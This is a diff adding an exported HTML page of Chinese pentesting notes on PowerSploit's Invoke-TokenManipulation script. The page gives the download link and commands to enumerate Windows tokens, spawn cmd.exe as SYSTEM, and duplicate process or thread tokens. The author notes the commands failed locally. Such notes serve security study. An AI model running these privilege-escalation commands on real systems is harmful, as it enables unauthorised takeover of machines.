@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Invoke-TokenManipulation</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Invoke-TokenManipulation</h1><br/>下载地址：<br /><br /><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a><br /><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\43-Invoke-TokenManipulation.ps1">Linked file: Invoke-TokenManipulation.ps1 </a></td></tr></table><br />原理和功能同incognito类似，能够实际提权和降权<br /><br />Import-Module ./Invoke-TokenManipulation.ps1<br /><br /><br />列举token：Invoke-TokenManipulation -Enumerate<br /><br />提权至system：Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot;<br /><br />复制进程token：Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 500<br /><br />复制线程token：Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ThreadId 500<br /><br /><br /><br />本机执行不成功<br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
